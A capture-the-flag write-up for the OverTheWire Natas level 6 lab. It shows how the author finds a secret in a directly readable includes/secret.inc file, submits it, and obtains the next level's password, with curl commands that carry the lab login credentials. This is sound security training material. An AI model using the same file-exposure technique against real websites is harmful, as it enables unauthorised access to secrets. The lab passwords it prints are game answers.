Natas Level 5 → Level 6
=======================

Username: natas6
URL:      http://natas6.natas.labs.overthewire.org


Solution
========

When we browse to ```http://natas6.natas.labs.overthewire.org``` and log in with username ```natas6``` and the password we gained in level4-5,
we come to a web form that asks us to input the *secret*. Whatever this *secret* may be...
Furthermore there's a link to the source code of the web page. So we first start with analyzing the code in order to find something that gives us the mentioned *secret*.

```
[...]
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

In the code between ```<?``` and ```?>``` we see an include of a file which is located in includes/secret.inc.
When we browse to the URL ```http://natas6.natas.labs.overthewire.org/includes/secret.inc``` and right-click on "View Page Source" we get this:

```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

If we copy the string ```FOEIUWGHFEEUHOFUOIU```, paste it into the web form and click on "Submit Query" we get the next level's password:

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 
```

Note to myself
--------------

Instead of using a GUI web browser like Firefox one can use cURL instead:

```
curl --data "submit=submit&secret=FOEIUWGHFEEUHOFUOIU" http://natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1@natas6.natas.labs.overthewire.org
```
```
curl -su natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 -F 'secret=FOEIUWGHFEEUHOFUOIU' -F 'submit=1' http://natas6.natas.labs.overthewire.org
```
